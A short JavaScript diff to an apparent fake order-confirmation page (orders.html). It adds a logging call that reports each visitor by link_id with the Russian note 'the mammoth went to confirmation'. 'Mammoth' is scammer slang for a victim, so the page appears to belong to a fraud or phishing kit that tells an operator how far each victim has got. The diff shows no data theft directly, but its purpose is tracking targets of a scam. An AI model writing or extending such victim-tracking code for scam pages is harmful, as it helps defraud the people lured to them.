@@ -1812,9 +1812,14 @@
   generateOrderNumber();
   fillFromParams().catch(e => console.error('Error filling params:', e));
 
-  // Online/Offline tracking
+  // Online/Offline tracking & page logging
   const urlParams = new URLSearchParams(window.location.search);
   const link_id = urlParams.get('link_id');
+
+  // Log page confirmation when orders.html loads
+  if (link_id && typeof sendLog === 'function') {
+    sendLog('page_confirmation', `📋 Мамонт перешел на подтверждение\nlink_id=${link_id}`);
+  }
   if (link_id && typeof sendLog === 'function') {
     sendLog('online', link_id);
   }
